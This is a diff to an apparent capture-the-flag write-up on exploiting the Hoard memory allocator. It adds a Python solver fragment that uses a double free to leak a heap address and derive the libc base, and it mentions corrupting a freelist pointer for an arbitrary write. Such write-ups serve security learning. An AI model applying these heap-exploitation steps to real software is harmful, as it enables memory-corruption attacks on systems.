@@ -189,10 +189,27 @@ During allocation, hoard first checks if the heap is already initialized and if 
 
 One thing about that is, when a chunk of memory is allocated using `mmap` the offset between the libc region and that memory is usually a bit constant 
 
-So suppose we have an address of a mmap chunk then we can offset it to get the libc base
+So suppose we have an address of an mmap'ed chunk then we can offset it to get the libc base
 
 To achieve this we need to first leak the address of the chunk, and we can do this using a double free
 
+```python
+def solve():
+    for _ in range(0x10):
+        read(b"A"*8)
+    
+    for _ in range(2):
+        free()
+    
+    global_heap = write() 
+    libc.address = global_heap - 0x3c0160
+    info("global heap: %#x", global_heap)
+    info("libc base: %#x", libc.address)
+```
+
+With libc leak gotten now we corrupt the pointer in the freelist to gain arb write 
+
+Limitation with that is we can only write 8 bytes into the allocated memory...
 
 
 
